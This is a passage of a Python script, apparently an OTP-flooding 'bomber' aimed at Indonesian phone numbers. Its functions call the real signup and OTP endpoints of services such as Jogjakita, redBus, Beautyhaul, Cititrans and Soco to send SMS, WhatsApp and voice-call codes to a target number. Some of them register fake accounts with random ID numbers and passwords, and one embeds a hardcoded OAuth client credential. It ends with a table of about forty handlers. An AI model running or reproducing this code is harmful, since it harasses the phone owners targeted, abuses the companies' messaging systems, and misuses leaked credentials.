    return False, str(d.get("msg") or f"gagal ({r.status_code})")[:40]


# =====================================================================
# 14. JOGJAKITA / BM SECURE  (WhatsApp - 2-step token + OTP)
# =====================================================================
def jogjakita(n08, n62, raw):
    s = requests.Session()
    s.headers.update(headers())
    # Step 1: Ambil access token OAuth
    r1 = s.post(
        "https://aci-user.bmsecure.id/oauth/token",
        headers={
            "Authorization": "Basic OGVjMzFmODctOTYxYS00NTFmLThhOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA0LWQ3NzgyNjRhZWEyZQ==",
            "Content-Type": "application/x-www-form-urlencoded",
        },
        data={
            "grant_type": "client_credentials",
            "uuid": "00000000-0000-0000-0000-000000000000",
            "id_user": "0", "id_kota": "0", "location": "0.0,0.0",
            "via": "jogjakita_user", "version_code": "521", "version_name": "6.12.1",
        },
        timeout=TIMEOUT,
    )
    d1 = _json(r1)
    tok = d1.get("access_token")
    if not tok:
        return False, "gagal oauth token"

    # Step 2: Kirim OTP WhatsApp
    payload = {
        "phone_user": n62,
        "primary_credential": {
            "device_id": "", "fcm_token": "", "id_kota": 0,
            "id_user": 0, "location": "0.0,0.0", "uuid": "",
            "version_code": "521", "version_name": "6.12.1", "via": "jogjakita_user",
        },
        "uuid": f"00000000-4c22-250d-3006-9a465f072739{''.join(random.choices(string.hexdigits, k=8))}",
        "version_code": "521", "version_name": "6.12.1", "via": "jogjakita_user",
    }
    r2 = s.post(
        "https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send",
        headers={
            "Content-Type": "application/json; charset=UTF-8",
            "Authorization": f"Bearer {tok}",
            "User-Agent": s.headers.get("User-Agent", ua()),
        },
        json=payload,
        timeout=TIMEOUT,
    )
    d2 = _json(r2)
    if r2.status_code == 200 and d2.get("rc") == 200:
        return True, "OTP WhatsApp terkirim"
    if d2.get("rc") == 429 or "limit" in str(d2.get("rd", "")).lower():
        return False, "rate limit"
    return False, str(d2.get("rd") or r2.status_code)[:40]


# =====================================================================
# 15. HRS-BRE  (PT Hasnur Riung Sinergi - WhatsApp)
# =====================================================================
def hrsbre(n08, n62, raw):
    s = requests.Session()
    s.headers.update(headers())
    s.get("https://career.hrs-bre.site/auth/sign_up", timeout=TIMEOUT)

    uid = uuid.uuid4().hex[:10]
    boundary = "----WebKitFormBoundary" + "".join(random.choices(string.ascii_letters, k=16))
    nik = "".join(random.choices(string.digits, k=16))
    email = f"user_{uid}@gmail.com"
    username = f"u_{uid}"
    password = "Pass" + uid[:5] + "!"

    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="nik"\r\n\r\n{nik}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="email"\r\n\r\n{email}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="whatsapp"\r\n\r\n{n08}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="username"\r\n\r\n{username}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="password"\r\n\r\n{password}\r\n'
        f"--{boundary}--\r\n"
    )
    r = s.post(
        "https://career.hrs-bre.site/auth/sign_up_action",
        data=body,
        headers=headers({
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Origin": "https://career.hrs-bre.site",
            "Referer": "https://career.hrs-bre.site/auth/sign_up",
        }),
        timeout=TIMEOUT,
    )
    low = r.text.lower()
    if "otp verification" in low or "otp code" in low:
        return True, "OTP WhatsApp terkirim"
    return _classify(r.status_code, r.text)


# =====================================================================
# 16. REDBUS  (SMS)
# =====================================================================
def redbus(n08, n62, raw):
    num_no_zero = n08[1:] if n08.startswith("0") else n08
    r = requests.get(
        f"https://m.redbus.id/api/getOtp?number={num_no_zero}&cc=62",
        headers=headers({
            "Origin": "https://m.redbus.id",
            "Referer": "https://m.redbus.id/",
        }),
        timeout=TIMEOUT,
    )
    d = _json(r)
    if r.status_code == 200 and (str(d.get("Code")) == "200" or "success" in str(d.get("Message", "")).lower()):
        return True, "OTP SMS terkirim"
    return False, str(d.get("Message") or r.status_code)[:40]


def redbus_wa(n08, n62, raw):
    num_no_zero = n08[1:] if n08.startswith("0") else n08
    r = requests.get(
        f"https://m.redbus.id/api/getOtp?number={num_no_zero}&cc=62&otpMode=WHATSAPP",
        headers=headers({
            "Origin": "https://m.redbus.id",
            "Referer": "https://m.redbus.id/",
        }),
        timeout=TIMEOUT,
    )
    d = _json(r)
    if r.status_code == 200 and (str(d.get("Code")) == "200" or "success" in str(d.get("Message", "")).lower()):
        return True, "OTP WhatsApp terkirim"
    return False, str(d.get("Message") or r.status_code)[:40]


# =====================================================================
# 17. BEAUTYHAUL  (WhatsApp)
# =====================================================================
def beautyhaul(n08, n62, raw):
    s = requests.Session()
    s.headers.update(headers({
        "Origin": "https://www.beautyhaul.com",
        "Referer": "https://www.beautyhaul.com/account/register",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/json",
    }))
    raw_num = n08[1:] if n08.startswith("0") else n08
    rnd_str = "".join(random.choices(string.ascii_lowercase, k=6))
    s.post(
        "https://www.beautyhaul.com/ajax/account/save_register",
        json={
            "nama_depan": "User", "nama_belakang": rnd_str.capitalize(),
            "email": f"usr{rnd_str}@gmail.com", "nomor_kode_id": "100",
            "nomor_kode_value": "62", "nomor_ponsel": raw_num,
            "password": f"Pass@{rnd_str}1", "konfirmasi_password": f"Pass@{rnd_str}1",
            "tanggal_lahir": "15 May 1998", "jenis_kelamin": "Female",
            "g-recaptcha-response": "", "subscribe": "true", "terms": "true",
        },
        timeout=TIMEOUT,
    )
    r = s.post(
        "https://www.beautyhaul.com/ajax/account/send_otp",
        json={"method": "WhatsApp"},
        timeout=TIMEOUT,
    )
    if r.status_code in (200, 201, 202):
        return True, "OTP WhatsApp terkirim"
    return _classify(r.status_code, r.text)


def beautyhaul_sms(n08, n62, raw):
    s = requests.Session()
    s.headers.update(headers({
        "Origin": "https://www.beautyhaul.com",
        "Referer": "https://www.beautyhaul.com/account/register",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/json",
    }))
    raw_num = n08[1:] if n08.startswith("0") else n08
    rnd_str = "".join(random.choices(string.ascii_lowercase, k=6))
    s.post(
        "https://www.beautyhaul.com/ajax/account/save_register",
        json={
            "nama_depan": "User", "nama_belakang": rnd_str.capitalize(),
            "email": f"usr{rnd_str}@gmail.com", "nomor_kode_id": "100",
            "nomor_kode_value": "62", "nomor_ponsel": raw_num,
            "password": f"Pass@{rnd_str}1", "konfirmasi_password": f"Pass@{rnd_str}1",
            "tanggal_lahir": "15 May 1998", "jenis_kelamin": "Female",
            "g-recaptcha-response": "", "subscribe": "true", "terms": "true",
        },
        timeout=TIMEOUT,
    )
    r = s.post(
        "https://www.beautyhaul.com/ajax/account/send_otp",
        json={"method": "SMS"},
        timeout=TIMEOUT,
    )
    if r.status_code in (200, 201, 202):
        return True, "OTP SMS terkirim"
    return _classify(r.status_code, r.text)


def beautyhaul_voice(n08, n62, raw):
    s = requests.Session()
    s.headers.update(headers({
        "Origin": "https://www.beautyhaul.com",
        "Referer": "https://www.beautyhaul.com/account/register",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/json",
    }))
    raw_num = n08[1:] if n08.startswith("0") else n08
    rnd_str = "".join(random.choices(string.ascii_lowercase, k=6))
    s.post(
        "https://www.beautyhaul.com/ajax/account/save_register",
        json={
            "nama_depan": "User", "nama_belakang": rnd_str.capitalize(),
            "email": f"usr{rnd_str}@gmail.com", "nomor_kode_id": "100",
            "nomor_kode_value": "62", "nomor_ponsel": raw_num,
            "password": f"Pass@{rnd_str}1", "konfirmasi_password": f"Pass@{rnd_str}1",
            "tanggal_lahir": "15 May 1998", "jenis_kelamin": "Female",
            "g-recaptcha-response": "", "subscribe": "true", "terms": "true",
        },
        timeout=TIMEOUT,
    )
    r = s.post(
        "https://www.beautyhaul.com/ajax/account/send_otp",
        json={"method": "Voice"},
        timeout=TIMEOUT,
    )
    if r.status_code in (200, 201, 202):
        return True, "OTP Voice Call terkirim"
    return _classify(r.status_code, r.text)


# =====================================================================
# 18. MISTER ALADIN  (SMS)
# =====================================================================
def misteraladin(n08, n62, raw):
    raw_num = n08[1:] if n08.startswith("0") else n08
    r = requests.post(
        "https://m.misteraladin.com/api/members/v2/otp/request",
        json={
            "phone_number_country_code": "62",
            "phone_number": raw_num,
            "type": "register",
        },
        headers=headers({
            "Content-Type": "application/json",
            "Origin": "https://m.misteraladin.com",
            "Referer": "https://m.misteraladin.com/account",
        }),
        timeout=TIMEOUT,
    )
    d = _json(r)
    if r.status_code == 200:
        return True, "OTP SMS terkirim"
    return _classify(r.status_code, d.get("message") or r.text)


# =====================================================================
# 19. CITITRANS  (WhatsApp & SMS)
# =====================================================================
def cititrans_wa(n08, n62, raw):
    h = headers({
        "Content-Type": "application/json",
        "Origin": "https://cititrans.co.id",
        "Referer": "https://cititrans.co.id/",
        "X-Cititrans-Client-From": "WEBSITE",
        "Accept": "application/json, text/plain, */*",
    })
    r = requests.post(
        "https://apimobile.cititrans.co.id/auth/requestOtp",
        json={"phone": n08, "method": "WHATSAPP"},
        headers=h,
        timeout=TIMEOUT,
    )
    d = _json(r)
    if r.status_code == 200 and d.get("success"):
        return True, "OTP WhatsApp terkirim"
    if r.status_code == 404:
        r_reg = requests.post(
            "https://apimobile.cititrans.co.id/user/register",
            json={
                "phone": n08,
                "name": "Tester QA",
                "email": f"test{n08[-6:]}@gmail.com",
                "method": "WHATSAPP",
            },
            headers=h,
            timeout=TIMEOUT,
        )
        d_reg = _json(r_reg)
        if r_reg.status_code == 200 and d_reg.get("success"):
            return True, "OTP WhatsApp terkirim"
        return _classify(r_reg.status_code, d_reg.get("message") or r_reg.text)
    return _classify(r.status_code, d.get("message") or r.text)


cititrans = cititrans_wa


def cititrans_sms(n08, n62, raw):
    h = headers({
        "Content-Type": "application/json",
        "Origin": "https://cititrans.co.id",
        "Referer": "https://cititrans.co.id/",
        "X-Cititrans-Client-From": "WEBSITE",
        "Accept": "application/json, text/plain, */*",
    })
    r = requests.post(
        "https://apimobile.cititrans.co.id/auth/requestOtp",
        json={"phone": n08, "method": "SMS"},
        headers=h,
        timeout=TIMEOUT,
    )
    d = _json(r)
    if r.status_code == 200 and d.get("success"):
        return True, "OTP SMS terkirim"
    if r.status_code == 404:
        r_reg = requests.post(
            "https://apimobile.cititrans.co.id/user/register",
            json={
                "phone": n08,
                "name": "Tester QA",
                "email": f"test{n08[-6:]}@gmail.com",
                "method": "SMS",
            },
            headers=h,
            timeout=TIMEOUT,
        )
        d_reg = _json(r_reg)
        if r_reg.status_code == 200 and d_reg.get("success"):
            return True, "OTP SMS terkirim"
        return _classify(r_reg.status_code, d_reg.get("message") or r_reg.text)
    return _classify(r.status_code, d.get("message") or r.text)


# =====================================================================
# 20. SOCO  (WhatsApp)
# =====================================================================
def soco_wa(n08, n62, raw):
    raw_num = n08[1:] if n08.startswith("0") else n08
    r = requests.post(
        "https://api.soco.id/auth/login/otp/request",
        json={
            "mode": "whatsapp",
            "entity": "phone_no",
            "entity_value": raw_num,
            "phone_code": "+62",
        },
        headers=headers({
            "Content-Type": "application/json",
            "Origin": "https://www.soco.id",
            "Referer": "https://www.soco.id/login",
            "Accept": "application/json, text/plain, */*",
        }),
        timeout=TIMEOUT,
    )
    d = _json(r)
    if r.status_code == 200 and d.get("success"):
        return True, "OTP WhatsApp terkirim"
    msg = d.get("message") or r.text
    if "Resending to the same destination is not allowed" in msg or "OTP_MAXIMUM" in str(d):
        return False, "cooldown / limit request"
    return _classify(r.status_code, msg)


# =====================================================================
# 21. SOCO SMS  (SMS)
# =====================================================================
def soco_sms(n08, n62, raw):
    raw_num = n08[1:] if n08.startswith("0") else n08
    r = requests.post(
        "https://api.soco.id/auth/login/otp/request",
        json={
            "mode": "sms",
            "entity": "phone_no",
            "entity_value": raw_num,
            "phone_code": "+62",
        },
        headers=headers({
            "Content-Type": "application/json",
            "Origin": "https://www.soco.id",
            "Referer": "https://www.soco.id/login",
            "Accept": "application/json, text/plain, */*",
        }),
        timeout=TIMEOUT,
    )
    d = _json(r)
    if r.status_code == 200 and d.get("success"):
        return True, "OTP SMS terkirim"
    msg = d.get("message") or r.text
    if "Resending to the same destination is not allowed" in msg or "OTP_MAXIMUM" in str(d):
        return False, "cooldown / limit request"
    return _classify(r.status_code, msg)


HANDLERS = {
    "duniagames": dunia_games,
    "tokopedia": tokopedia,
    "tokopedia_sms": tokopedia_sms,
    "bonusbelanja": bonus_belanja,
    "bonusbelanja_sms": bonus_belanja_sms,
    "bonusbelanja_voice": bonus_belanja_voice,
    "mapclub": mapclub,
    "cairin": cairin,
    "cairin_voice": cairin_voice,
    "indosaku": indosaku,
    "indosaku_voice": indosaku_voice,
    "indosaku_wa": indosaku_wa,
    "kredione": kredione,
    "kredione_sms": kredione_sms,
    "kredione_voice": kredione_voice,
    "kreditnavigator": kreditnavigator,
    "kreditnavigator_voice": kreditnavigator_voice,
    "kreditnavigator_wa": kreditnavigator_wa,
    "rupiahcepat": rupiahcepat,
    "adakami": adakami,
    "adiraku": adiraku,
    "adiraku_sms": adiraku_sms,
    "adiraku_voice": adiraku_voice,
    "singa": singa,
    "singa_sms": singa_sms,
    "paxbar": paxbar,
    "jogjakita": jogjakita,
    "hrsbre": hrsbre,
    "redbus": redbus,
    "redbus_wa": redbus_wa,
    "beautyhaul": beautyhaul,
    "beautyhaul_sms": beautyhaul_sms,
    "beautyhaul_voice": beautyhaul_voice,
    "misteraladin": misteraladin,
    "cititrans": cititrans_wa,
    "cititrans_wa": cititrans_wa,
    "cititrans_sms": cititrans_sms,
    "soco": soco_wa,
    "soco_sms": soco_sms,
}
